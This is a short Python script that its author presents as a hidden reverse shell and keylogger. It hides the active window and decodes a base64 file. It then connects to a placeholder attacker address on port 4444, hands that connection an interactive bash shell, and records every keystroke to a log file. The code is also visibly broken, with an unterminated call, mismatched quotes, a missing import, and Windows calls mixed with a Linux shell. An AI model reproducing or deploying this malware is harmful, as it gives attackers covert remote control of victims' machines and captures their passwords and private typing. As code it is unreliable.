#an encrypted, hide reverse shell & keylogger by Th3L1ghtn1ng 
import subprocess
import socket
import keyboard
import pynput
from pynput.keyboard import Key, Listener
import logging
import base64
import win32gui, win32con

the_program_to_hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(the_program_to_hide , 

with open(ReverseBolt.py'', 'rb') as f:
    data = f.read()
with open('newfile', 'wb') as f:
    f.write(base64.decodebytes(data))
def connecttohost():
    so = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    so.connect(("<ip_address>", 4444))
    os.dup2(so.fileno(),0) 
    os.dup2(so.fileno(),1)
    os.dup2(so.fileno(),2)
    p = subprocess.call(["/bin/bash", "-i"])
connecttohost()
 
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
def on_press(key):
    logging.info(str(key))
 
with Listener(on_press=on_press) as listener :
    listener.join()
